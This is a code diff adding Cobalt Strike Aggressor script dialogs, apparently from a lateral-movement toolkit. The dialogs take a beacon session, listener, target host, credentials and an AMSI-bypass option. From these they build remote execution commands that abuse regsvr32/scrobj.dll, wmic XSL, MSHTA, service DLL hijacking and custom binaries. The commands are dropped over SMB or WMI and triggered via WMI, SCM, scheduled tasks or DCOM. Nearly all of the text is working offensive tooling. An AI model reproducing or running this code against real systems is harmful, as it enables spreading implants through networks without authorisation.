+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = "". $cmdarch . "" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}
+	}));
+	dialog_description($dialog, "Leverage MSHTA for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::regsvr32_file{
+	local('$payloadtype $descname $exectemplate $bid $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - RegSvr32", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.sct", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "RegSvr32 Lateral Movement";
+		$exectemplate = "regsvr32.sct";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\regsvr32.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\regsvr32.exe ";
+		}
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "/s /u /i:" . $3['droplocation'] ."\\" . $3['filename'] . " scrobj.dll";
+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = "". $cmdarch . "/s /u /i:" . $3['droplocation'] ."\\" . $3['filename'] . " scrobj.dll";
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}
+	}));
+	dialog_description($dialog, "Leverage RegSvr32 for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::wmic_file{
+	local('$payloadtype $descname $exectemplate $bid $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - WMIC", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.xsl", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "false";
+		$descname = "WMIC Lateral Movement";
+		$exectemplate = "wmic.xsl";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+
+		#Can't used env vars
+		if($3['x86'] eq "false"){
+			$cmdarch = "C:\\Windows\\System32\\wbem\\wmic.exe ";
+		}
+		else {
+			$cmdarch = "C:\\Windows\\SysWOW64\\wbem\\wmic.exe ";
+		}
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $cmdarch . "os get name /FORMAT:" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = "". $cmdarch . "os get name /FORMAT:" . $3['droplocation'] ."\\" . $3['filename'] . "";
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}
+	}));
+	dialog_description($dialog, "Leverage WMIC for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::custom_nonprebuilt{
+	local('$payloadtype $descname $exectemplate $bid $compile $latcommand $cmdarch');
+	$dialog = dialog("Lateral Movement - Custom Non-Prebuilt", %(bid => "", listener => "", droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", x86 => %moveKit::movedefaults["x86"], amsi => %moveKit::movedefaults["amsi"], staged => %moveKit::movedefaults["staged"], auto => %moveKit::movedefaults["auto"]), lambda({
+		$payloadtype = "raw";
+		$compile = "true";
+		$descname = "NonPreBuiltCustom Lateral Movement";
+		$exectemplate = "custom-nonpre.cs";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
+
+		$latcommand = "". $3['droplocation'] . "\\" . $3['filename'] . "";
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService")){
+			$exectemplate = "service-custom-nonpre.cs";
+		}
+		&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage Custom File for lateral movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, 'computername', 'TargetHost: ');
+	drow_text($dialog, 'credential', 'Credentials: ');
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::custom_prebuilt{
+	local('$handle $pldata $payloadtype $descname $latcommand $scmd');
+	$dialog = dialog("Lateral Movement - Custom Prebuilt", %(bid => "", file => %moveKit::movedefaults["file"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.exe", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", override => %moveKit::movedefaults["override"], auto => %moveKit::movedefaults["auto"], droptype => %moveKit::movedefaults["droptype"], cmdtrigger => %moveKit::movedefaults["cmdtrigger"], amsi => %moveKit::movedefaults["amsi"], svcbin => "false"), lambda({
+		$payloadtype = "custom";
+		$descname = "PreBuiltCustom Lateral Movement";
+		$opts = $3;
+		&moveKit::prechecks($3['bid'], "", $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto'], $3['file']);
+		if($3['override'] eq ""){
+			$scmd = "" . $3['droplocation'] ."\\" . $3['filename'] . "";
+		}
+		else{
+			$scmd = $3['override'];
+		}
+
+		if(($3['cmdtrigger'] eq "SCM") || ($3['cmdtrigger'] eq "ModifyService") && ($3['svcbin'] eq "false")){
+			$latcommand = "C:\\WINDOWS\\System32\\cmd.exe /c ". $scmd . "";
+			prompt_confirm("WARNING: Using this technique will force spawning cmd.exe and your command as a child process\nDo you want to continue?", "Usage warning", { &moveKit::bearings($opts, $latcommand, $payloadtype, $compile, $descname, $exectemplate); });
+		}
+		else{
+			$latcommand = $scmd;
+			&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+		}		
+	}));
+	dialog_description($dialog, "Leverage a Custom File for lateral movement \nDefault command is fullpath and file but you can override command with custom one");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_file($dialog, "file", "File: ");
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "Evt/Tsk/Svc Name: ");
+	drow_text($dialog, "computername", "TargetHost: ");
+	drow_text($dialog, "credential", "Credentials: ");
+	drow_text_big($dialog, "override", "Custom Command: ");
+	drow_checkbox($dialog, "auto", "Auto host or upload: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "svcbin", "Service exe: ", "Is file is a service executable");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+sub moveDialogs::service_dll_hijack{
+	local('$handle $pldata $payloadtype $sharptask $descname');
+	$dialog = dialog("Lateral Movement - Service DLL Hijack", %(bid => "", file => %moveKit::movedefaults["file"], servicename => "", location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "moveme.dll", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", override => %moveKit::movedefaults["override"], auto => %moveKit::movedefaults["auto"], droptype => %moveKit::movedefaults["droptype"]), lambda({
+		$payloadtype = "custom";
+		$descname = "ServiceDllHijack Lateral Movement";
+		$sharptask = "";
+		&moveKit::prechecks($3['bid'], "", $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto'], $3['file']);
+		if($3['override'] eq ""){
+			$latcommand = "" . $3['droplocation'] ."\\" . $3['filename'] . "";
+		}
+		else{
+			$latcommand = $3['override'];
+		}
+		&moveKit::bearings($3, $latcommand, $payloadtype, $compile, $descname, $exectemplate);
+	}));
+	dialog_description($dialog, "Leverage Service DLL Hijacking for Lateral Movement");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_file($dialog, "file", "File: ");
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "servicename", "ServiceName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, "computername", "TargetHost: ");
+	drow_text($dialog, "credential", "Credentials: ");
+	drow_text($dialog, "override", "Custom Command: ");
+	drow_checkbox($dialog, "auto", "Auto host or upload: ", "Auto Host or Move file");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
+
+
+#---------------------------------------------
+#Write Files Only
+#---------------------------------------------
+sub moveDialogs::write_file_only{
+	local('$handle $pldata $payloadtype $sharptask $descname');
+	$dialog = dialog("Write File", %(bid => "", writetype => "SMB to file", listener => %moveKit::movedefaults["listener"], file => %moveKit::movedefaults["file"], location => %moveKit::movedefaults["location"], droplocation => %moveKit::movedefaults["droplocation"], filename => "", reglocation => "", valuename => "", classname => "", wmins => "root\\CIMv2", eventname => %moveKit::movedefaults["eventname"], computername => "", credential => "", b64file => "false", comress => "false", description => "File Write Only"), lambda({
+		# needs some sort of prechecks
+		&moveKit::writeonlybuilder($3);
+	}));
+	dialog_description($dialog, "Write data or files to remote or local target - CURRENTLY NO PRECHECKS");
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_combobox($dialog, "writetype", "File Write Method: ", @("SMB to file", "WMI to file", "WMI to Regisry", "WMI to New WMIClass"));
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_file($dialog, "file", "File: ");
+	#drow_file($dialog, "template", "Template: ");
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "reglocation", "Registry Location: ");
+	drow_text($dialog, "valuename", "Registry Value Name: ");
+	drow_text($dialog, "classname", "Class Name: ");
+	#drow_text($dialog, "wmins", "WMI Namespace: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_text($dialog, "computername", "TargetHost: ");
+	drow_text($dialog, "credential", "Credentials: ");
+	drow_checkbox($dialog, "b64file", "Base64 File: ", "Base64 File (only file)");
+	#drow_checkbox($dialog, "compress", "Gzip: ", "Compress file content");
+	dbutton_action($dialog, "Execute");
+	dbutton_action($dialog, "Help");
+	dialog_show($dialog);
+}
